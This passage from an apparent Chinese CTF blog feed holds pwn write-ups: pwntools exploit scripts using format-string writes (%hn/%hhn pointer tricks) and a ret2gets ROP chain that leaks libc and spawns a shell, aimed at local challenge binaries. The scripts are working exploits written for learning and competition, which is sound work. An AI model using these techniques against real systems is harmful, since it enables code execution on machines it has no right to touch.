class="line">ogg=libc_base+0xe3b01</span><br><span class="line">addr=(stack&amp;0xffff)-15</span><br><span class="line">payload  = b&#x27;%p&#x27;*9</span><br><span class="line">payload += b&#x27;%&#x27;+str(addr - 92).encode()+b&#x27;c%hn&#x27;#11</span><br><span class="line">payload += b&#x27;%&#x27;+str(0x10007b-addr).encode()+b&#x27;c%39$hhn&#x27;</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line">add=(stack+17-0x18)&amp;0xffff</span><br><span class="line">li(hex(add))</span><br><span class="line">sleep(0.5)</span><br><span class="line">payload = b&#x27;%&#x27;+str(0x7b).encode()+b&#x27;c%39$hhn&#x27;</span><br><span class="line">payload+= b&#x27;%&#x27;+str(add-0x7b).encode()+b&#x27;c%27$hn&#x27;</span><br><span class="line">payload =payload.ljust(0x100,b&#x27;\x00&#x27;)</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.5)</span><br><span class="line">payload = b&#x27;%&#x27;+str(0x7b).encode()+b&#x27;c%39$hhn&#x27;</span><br><span class="line">payload+= b&#x27;%&#x27;+str((ogg&amp;0xffff)-0x7b).encode()+b&#x27;c%41$hn&#x27;</span><br><span class="line">payload =payload.ljust(0x100,b&#x27;\x00&#x27;)</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">sleep(0.5)</span><br><span class="line">payload = b&#x27;%&#x27;+str(0x7b).encode()+b&#x27;c%39$hhn&#x27;</span><br><span class="line">payload+= b&#x27;%&#x27;+str(add+2-0x7b).encode()+b&#x27;c%27$hn&#x27;</span><br><span class="line">payload =payload.ljust(0x100,b&#x27;\x00&#x27;)</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.5)</span><br><span class="line">payload = b&#x27;%&#x27;+str(0x7b).encode()+b&#x27;c%39$hhn&#x27;</span><br><span class="line">payload+= b&#x27;%&#x27;+str((ogg&gt;&gt;16&amp;0xffff)-0x7b).encode()+b&#x27;c%41$hn&#x27;</span><br><span class="line">payload =payload.ljust(0x100,b&#x27;\x00&#x27;)</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.5)</span><br><span class="line">payload = b&#x27;%&#x27;+str(0x7b).encode()+b&#x27;c%39$hhn&#x27;</span><br><span class="line">payload+= b&#x27;%&#x27;+str(add+2+2-0x7b).encode()+b&#x27;c%27$hn&#x27;</span><br><span class="line">payload =payload.ljust(0x100,b&#x27;\x00&#x27;)</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.5)</span><br><span class="line">payload = b&#x27;%&#x27;+str(0x7b).encode()+b&#x27;c%39$hhn&#x27;</span><br><span class="line">payload+= b&#x27;%&#x27;+str((ogg&gt;&gt;32)-0x7b).encode()+b&#x27;c%41$hn&#x27;</span><br><span class="line">payload =payload.ljust(0x100,b&#x27;\x00&#x27;)</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = b&#x27;%&#x27;+str(0x069e).encode()+b&#x27;c%39$hn&#x27;</span><br><span class="line">payload =payload.ljust(0x100,b&#x27;\x00&#x27;)</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#a=p.recvall()</span><br><span class="line">#print(len(a)-1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="master-of-rop">master_of_rop</h4><p>题目：</p><p><img src="https://s2.loli.net/2025/05/26/8W51rtY79eGqELi.png" alt="image"></p><p>只存在一个gets，没有pop_rdi，如何去控制rdi呢，这里引入一种比较新颖的手法，ret2gets，在 gets 返回后，rdi 通常指向 _IO_stdfile_0_lock，这是一个 libc 中的可写地址。攻击者可以利用这一点，通过 ROP 链再次调用 gets，向 _IO_stdfile_0_lock 写入任意数据，具体原理会另外写一篇文章分析了，这里直接用了</p><p>第一个paylaod</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*(0x20)+p64(0)</span><br><span class="line">payload+= p64(elf.plt[&#x27;gets&#x27;])</span><br><span class="line">payload+= p64(elf.plt[&#x27;puts&#x27;])</span><br><span class="line">payload+= p64(0x401100)+p64(0x4011AD)</span><br></pre></td></tr></table></figure><p>控制返回地址为gets，往_IO_stdfile_0_lock写入(b&quot;A&quot; * 4 + b&quot;\x00&quot;*3)，然后会泄露出TLS，由此计算偏移即可得到libc地址，通知控制返回地址为main，为了第二次打ROP链</p><p>这里可以直接用libc中的pop_rdi，也可以用ret2gets的paylaod，这里不能直接输入/bin/sh，调试发现第二个/被转换为. ，可以直接用$0或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(b&quot;/bin&quot; + p8(u8(b&quot;/&quot;)+1) + b&quot;sh&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr(size):</span><br><span class="line">return u64(p.recv(size).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">rl(&quot;Welcome to LitCTF2025!&quot;)</span><br><span class="line">payload = b&#x27;a&#x27;*(0x20)+p64(0)</span><br><span class="line">payload+= p64(elf.plt[&#x27;gets&#x27;])</span><br><span class="line">payload+= p64(elf.plt[&#x27;puts&#x27;])</span><br><span class="line">payload+= p64(0x401100)+p64(0x4011AD)</span><br><span class="line">#bug()</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">#pause()</span><br><span class="line">sleep(0.2)</span><br><span class="line">p.sendline(b&quot;A&quot; * 4 + b&quot;\x00&quot;*3)</span><br><span class="line"></span><br><span class="line">p.recv(8)</span><br><span class="line">p.recv(8)</span><br><span class="line">tls = u64(p.recv(6) + b&quot;\x00\x00&quot;)</span><br><span class="line">li(hex(tls))</span><br><span class="line">libc_base = tls -0x3a5740</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line"></span><br><span class="line">rl(&quot;Welcome to LitCTF2025!&quot;)</span><br><span class="line">payload = b&#x27;a&#x27;*(0x20)+p64(0)</span><br><span class="line">payload+= p64(elf.plt[&#x27;gets&#x27;])</span><br><span class="line">payload+= p64(system)</span><br><span class="line"></span><br><span class="line">#bug()</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">sleep(0.2)</span><br><span class="line">#sl(b&#x27;$0\x00&#x27;)</span><br><span class="line">p.sendline(b&quot;/bin&quot; + p8(u8(b&quot;/&quot;)+1) + b&quot;sh&quot;)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">LitCTF-pwn</summary>
    
    
    
    <category term="Writeup" scheme="https://www.thir0th.xyz/categories/Writeup/"/>
    
    
    <category term="CTF" scheme="https://www.thir0th.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>极限fmt利用🧐</title>
    <link href="https://www.thir0th.xyz/posts/98523a9a.html"/>
    <id>https://www.thir0th.xyz/posts/98523a9a.html</id>
    <published>2025-05-07T08:10:35.000Z</published>
    <updated>2025-05-07T08:23:09.124Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h1>极限fmt利用🧐</h1><p>2024Moectf的一道题目，十分有趣的格式化字符串利用😊，最终效果是完成了一次格式化字符串修改两个地方，也就是打一次非栈上fmt的指针跳板。这波属实有点极限</p><h3 id="题目附件">题目附件</h3><p>夸克链接：<a href="https://pan.quark.cn/s/3ad0ae74c376">https://pan.quark.cn/s/3ad0ae74c376</a></p><h3 id="题目分析">题目分析</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1746521949448-cac6c469-179e-43d8-b8ee-6bd77bce5502.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1746521771048-cb5d8c4e-922a-4bb8-ad45-8ecdb6b9f059.png" alt=""></p><p>开局给了一个栈地址，后边给了一次非栈上fmt的机会，同时题目给出后门，保护是全开的</p><p>返回地址和后门之间只差一个字节</p><p>ret:</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1746522005933-8af532fe-31f7-4c17-8764-3a63ffc3bfe2.png" alt=""></p><p>backdoor:</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1746522046777-6274d413-a195-435b-9177-6e2ea2d0db1f.png" alt=""></p><p>按照正常的思路，需要构造一次指针跳板，造成a-&gt;b-&gt;ret-&gt;main,再去修改b地址偏移main的最后一个字节，但是%n是将前边的字节数写入对应偏移的位置，这里就有一个小tips</p><p><font style="color:#DF2A3F;">不管你输入的字节数是多少，%hhn只会去将总字节数的最后一个字节写入对应偏移处</font></p><p>例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x10000000c</span></span><br><span class="line"><span class="number">0x1000000c</span></span><br><span class="line"><span class="number">0x100000c</span></span><br><span class="line"><span class="number">0x10000c</span></span><br><span class="line">最后都是将<span class="number">0x0c</span>写入对应偏移处</span><br></pre></td></tr></table></figure><p>前提是比前边全部输入的总字节数要多</p><h4 id="错误思路">错误思路</h4><p>按照我们之前指针跳板的思路，应该是这样构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload =<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%15$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x10008</span>-(stack&amp;<span class="number">0xffff</span>)).encode()+<span class="string">b&#x27;c%45$hhn&#x27;</span></span><br></pre></td></tr></table></figure><p>实际只修改了第一个地址，第二个没有修改</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1746523548182-e25f8045-7f7f-4a24-912c-fca8b5637102.png" alt=""></p><p>引用</p><p><font style="color:rgb(85, 85, 85);">猜测：任意地址写用 </font><code>&lt;font style=&quot;color:rgb(68, 68, 68);&quot;&gt;$&lt;/font&gt;</code><font style="color:rgb(85, 85, 85);"> 指定写入和按参数顺序写入的操作是先后分开的，先按参数顺序写入指针后，再用 </font><code>&lt;font style=&quot;color:rgb(68, 68, 68);&quot;&gt;$&lt;/font&gt;</code><font style="color:rgb(85, 85, 85);"> 去在刚刚的指针基础上进行修改。</font><strong><font style="color:rgb(85, 85, 85);">注意：这仅仅是个猜测，真相应该去源码中找到答案</font></strong><font style="color:rgb(85, 85, 85);"> （以后有机会的话，我应该会去分析 </font><code>&lt;font style=&quot;color:rgb(68, 68, 68);&quot;&gt;printf&lt;/font&gt;</code><font style="color:rgb(85, 85, 85);"> 函数的源码，来探究出这个答案，但可惜不是现在</font><font style="color:rgb(85, 85, 85);">🤔</font><font style="color:rgb(85, 85, 85);">）</font></p><h4 id="font-style-color-rgb-85-85-85-正确思路-font"><font style="color:rgb(85, 85, 85);">正确思路</font></h4><p>paylaod</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;%p&#x27;</span>*<span class="number">13</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack&amp;<span class="number">0xffff</span>)-<span class="number">138</span>).encode()+<span class="string">b&#x27;c%hn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x10008</span>-(stack&amp;<span class="number">0xffff</span>)).encode()+<span class="string">b&#x27;c%45$hhn&#x27;</span></span><br></pre></td></tr></table></figure><p><code>printf</code> 解析参数会根据 <code>%</code> 进行判断，在 <code>hn</code> 前面一共有 <code>15</code> 个 <code>%</code> ，所以这个 <code>%xxxc%hn</code> 会将 <code>xxx</code> 数据加上 <code>%p</code> 泄露的字符个数写入第十五个参数</p><p>13+1+1=15</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1746542481788-65409221-f118-4d3a-8703-172e921beae4.png" alt=""></p><p>stack&amp;0xffff 这个是返回地址的最后两个字节</p><p>-138  前边的%p泄露的东西，需要减去这些字符数，这里需要手动调试计算，不同版本对应也不同</p><p>0x8b是139，多接受了一个\n，听别的师傅才发现这个用法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = p.recvall()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(a)-<span class="number">1</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1746533718448-c3fef211-3c49-4dcd-9b7d-72a6839cda3d.png" alt=""></p><p>一开始是直接ai生成的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak = b&#x27;0x5555555580400x1000x7ffff7d147e20x1e0x7fffffffbc7c(nil)0x536eddd9e5d93f000x7fffffffdf300x5555555552d90x10x7ffff7c29d90(nil)0x5555555552bd&#x27;</span></span><br><span class="line">leak = <span class="string">b&#x27;0x5555555580400x1000x7ffff7d147e20xb0x7fffffffbc84(nil)0x8b916887b95c3b000x10x7ffff7c29d90(nil)0x5555555551a90x100000000&#x27;</span></span><br><span class="line">decoded = leak.decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 存储解析出的地址</span></span><br><span class="line">results = []</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(decoded):</span><br><span class="line">    <span class="keyword">if</span> decoded.startswith(<span class="string">&#x27;0x&#x27;</span>, i):</span><br><span class="line">        <span class="comment"># 找下一个 &#x27;0x&#x27; 或 &#x27;(nil)&#x27; 的位置</span></span><br><span class="line">        j = i + <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> j &lt; <span class="built_in">len</span>(decoded) <span class="keyword">and</span> <span class="keyword">not</span> decoded.startswith(<span class="string">&#x27;0x&#x27;</span>, j) <span class="keyword">and</span> <span class="keyword">not</span> decoded.startswith(<span class="string">&#x27;(nil)&#x27;</span>, j):</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        results.append(decoded[i:j])</span><br><span class="line">        i = j</span><br><span class="line">    <span class="keyword">elif</span> decoded.startswith(<span class="string">&#x27;(nil)&#x27;</span>, i):</span><br><span class="line">        results.append(<span class="string">&#x27;(nil)&#x27;</span>)</span><br><span class="line">        i += <span class="number">5</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 防止死循环</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出每项和总长度</span></span><br><span class="line">total_length = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;提取结果及长度：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> idx, item <span class="keyword">in</span> <span class="built_in">enumerate</span>(results, <span class="number">1</span>):</span><br><span class="line">    length = <span class="built_in">len</span>(item)</span><br><span class="line">    total_length += length</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;idx:&gt;<span class="number">2</span>&#125;</span>. <span class="subst">&#123;item:&lt;<span class="number">20</span>&#125;</span> 长度: <span class="subst">&#123;length&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\n总长度（字节数）: <span class="subst">&#123;total_length&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>0x10008只是将最后一个字节改为0x08，只要比前边字节大得多就可以实现</p><p>完成利用</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1746524214171-3c748b3e-5626-498a-9da4-4e3599698377.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>(<span class="params">size</span>):</span><br><span class="line"><span class="keyword">return</span> u64(p.recv(size).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hook</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>],libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6&#x27;</span>)   </span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">rl(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)+<span class="number">0x18</span></span><br><span class="line">li(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">rl(<span class="string">&quot;You will have only one chance!&quot;</span>)</span><br><span class="line"><span class="comment">#payload =b&#x27;%&#x27;+str(stack&amp;0xffff).encode()+b&#x27;c%15$hn&#x27;</span></span><br><span class="line"><span class="comment">#payload+=b&#x27;%&#x27;+str(0x10008-(stack&amp;0xffff)).encode()+b&#x27;c%45$hhn&#x27;</span></span><br><span class="line">payload=<span class="string">b&#x27;%p&#x27;</span>*<span class="number">13</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack&amp;<span class="number">0xffff</span>)-<span class="number">138</span>).encode()+<span class="string">b&#x27;c%hn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x10008</span>-(stack&amp;<span class="number">0xffff</span>)).encode()+<span class="string">b&#x27;c%45$hhn&#x27;</span></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h3 id="第六届强网拟态线下赛-pwn">第六届强网拟态线下赛-pwn</h3><p>也是这个的点的利用，但这道题目更难一些，解题思路也更加新颖，感觉格式化字符串的思路更极限了</p><h4 id="题目分析-2">题目分析</h4><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1746603585849-cc4dd0a2-2beb-4b1c-afa1-37095bf22ecc.png" alt=""></p><p>libc版本是2.31的</p><p>给了一个栈地址的最后两个字节，同时有一次非栈上fmt的机会，保护除了canary都是开着的，最后是调用_exit退出。</p><p>第一步肯定是想如何去控制返回地址，达到多次利用fmt的效果，这里我们就劫持printf的返回地址为main</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload =  <span class="string">b&#x27;%p&#x27;</span>*<span class="number">9</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(printf_ret - <span class="number">90</span>).encode()+<span class="string">b&#x27;c%hn&#x27;</span><span class="comment">#11</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x100023</span> - printf_ret).encode()+<span class="string">b&#x27;c%39$hhn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>后续补全0x100字节是为了避免read把两次读入的payload一次读入</p><p>这里再强调一下，一个%代表一个偏移，payload += b’%‘+str(printf_ret - 90).encode()+b’c%hn’#11本身是有两个%的，所以算两个偏移</p><p>计算%p*9的字节数还可以用,-1是因为\n</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=p.recvall()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(a)-<span 